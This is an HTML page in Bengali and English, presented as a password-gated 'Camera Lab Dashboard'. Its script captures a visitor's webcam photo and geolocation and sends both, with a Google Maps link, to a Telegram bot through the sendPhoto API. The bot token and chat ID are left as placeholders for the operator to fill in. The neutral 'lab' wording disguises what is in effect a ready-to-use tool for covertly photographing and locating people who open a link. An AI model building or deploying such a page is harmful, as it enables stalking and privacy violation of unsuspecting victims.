<!DOCTYPE html>
<html lang="bn">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Gateway</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f4f6f9; color: #333; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
        input[type="password"] { width: 80%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; text-align: center; }
        video { width: 100%; max-width: 320px; background: black; border-radius: 8px; display: none; margin-top: 15px; }
        .btn { padding: 12px 24px; margin: 5px; border: none; border-radius: 6px; cursor: pointer; color: white; font-weight: bold; font-size: 16px; width: 100%; max-width: 280px; }
        #capBtn { background: #dc3545; display: none; }
        #startBtn { background: #007bff; }
        #msg { margin-top: 15px; font-weight: bold; color: #28a745; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <!-- ১. প্রথম ধাপ: পাসওয়ার্ড স্ক্রিন -->
        <div id="authSection">
            <h2>Enter Access Password</h2>
            <p style="color:#666; font-size:14px;">ল্যাব পোর্টালে প্রবেশ করতে কী (Password) দিন</p>
            <input type="password" id="passwordInput" placeholder="Password..."><br>
            <button onclick="verifyPassword()" style="padding:12px 24px; background:#28a745; color:white; border:none; border-radius:6px; cursor:pointer; font-weight:bold; font-size:16px;">Verify & Enter</button>
        </div>

        <!-- ২. দ্বিতীয় ধাপ: ড্যাশবোর্ড সেকশন -->
        <div id="dashboardSection" style="display:none;">
            <h2>Camera Lab Dashboard</h2>
            <p style="color:#666; margin-bottom:15px;">নিচের বাটনে ক্লিক করে ক্যামেরা ও লোকেশন মডিউল চালু করুন</p>
            <button class="btn" id="startBtn" onclick="initiateLab()">Open Camera & Location</button>
            <button class="btn" id="capBtn" onclick="capture()">Capture Data</button>
            <br>
            <video id="v" autoplay playsinline></video>
            <canvas id="c" style="display:none"></canvas>
            <p id="msg"></p>
        </div>
    </div>

    <script>
        const SECRET_PASSWORD = "Tamim0186#@";
        
        // ⚠️ আপনার টেলিগ্রাম বটের Token এবং Chat ID এখানে বসাবেন
        const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; 
        const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";

        let userLatitude = "Unknown";
        let userLongitude = "Unknown";

        function verifyPassword() {
            const inputPass = document.getElementById('passwordInput').value;
            if (inputPass === SECRET_PASSWORD) {
                document.getElementById('authSection').style.display = 'none';
                document.getElementById('dashboardSection').style.display = 'block';
            } else {
                alert("ভুল পাসওয়ার্ড! আবার চেষ্টা করুন।");
            }
        }

        async function initiateLab() {
            document.getElementById('msg').innerText = "অ্যাক্সেস পারমিশন চাওয়া হচ্ছে...";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        userLatitude = position.coords.latitude;
                        userLongitude = position.coords.longitude;
                    },
                    (error) => { console.log("Location denied."); }
                );
            }

            try {
                const s = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
                document.getElementById('v').srcObject = s;
                document.getElementById('v').style.display = 'inline-block';
                document.getElementById('startBtn').style.display = 'none';
                document.getElementById('capBtn').style.display = 'inline-block';
                document.getElementById('msg').innerText = "✅ ক্যামেরা এবং লোকেশন মডিউল সচল হয়েছে। এবার Capture-এ চাপুন।";
            } catch(e) {
                alert("ক্যামেরা অ্যাক্সেস পাওয়া যায়নি!");
            }
        }

        function capture() {
            const v = document.getElementById('v'), c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
            const dataUrl = c.toDataURL('image/jpeg');
            document.getElementById('msg').innerText = "ডেটা প্রসেস হচ্ছে...";
            
            fetch(dataUrl)
            .then(res => res.blob())
            .then(blob => {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                
                const captionText = `🎯 নতুন ল্যাব ডেটা:\n\n📍 Latitude: ${userLatitude}\n📍 Longitude: ${userLongitude}\n🌐 Google Maps: https://www.google.com/maps?q=${userLatitude},${userLongitude}`;
                formData.append('caption', captionText);

                return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            })
            .then(r => r.json())
            .then(data => {
                if(data.ok) {
                    document.getElementById('msg').innerText = "✅ সফলভাবে ডেটা সেভ হয়েছে!";
                } else {
                    document.getElementById('msg').innerText = "❌ বটের টোকেন বা আইডি কনফিগার করা হয়নি।";
                }
            })
            .catch(err => {
                document.getElementById('msg').innerText = "❌ কানেকশন এরর।";
            });
        }
    </script>
</body>
</html>
